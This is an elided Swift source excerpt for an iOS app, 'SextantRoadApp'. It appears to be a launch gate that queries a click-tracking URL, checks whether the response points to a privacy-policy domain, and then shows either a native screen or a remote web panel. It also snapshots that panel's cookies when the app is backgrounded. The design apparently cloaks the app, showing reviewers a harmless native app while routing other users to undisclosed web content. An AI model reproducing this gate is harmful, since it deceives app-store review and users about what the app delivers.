...
final class SeaGateTracker: NSObject, URLSessionTaskDelegate {
    var onProgress: (() -> Void)?
...
@MainActor
final class SeaLaunchGate: ObservableObject {
    ...
    private func attempt(_ n: Int) {
        ...
        let tracker = SeaGateTracker(checkDomain: checkDomain, ownHost: ownHost)
...
struct SextantRoadApp: App {
    ...
    @StateObject private var gate = SeaLaunchGate(
        sourceLink: "https://rainwize.org/click.php",
        checkDomain: "termsfeed.com")
    @Environment(\.scenePhase) private var scenePhase
    @State private var pagePainted = false
    @State private var panelDeadEnd = false

    private var resumeAddress: String? { SeaPanelSession.resumeAddress() }
    ...
    var body: some Scene {
        WindowGroup {
            Group {
                if let ready = gate.ready {
                    if ready && !panelDeadEnd { panel } else { native }
                } else {
                    SeaLoadingScreen()
        ...
        .onChange(of: scenePhase) { phase in
            ...
            if gate.ready == true, phase != .active {
                SeaPanelCookies.snapshot()
            }
        }
    }

    private var panel: some View {
        SeaWebPanel(urlString: resumeAddress ?? gate.sourceLink,
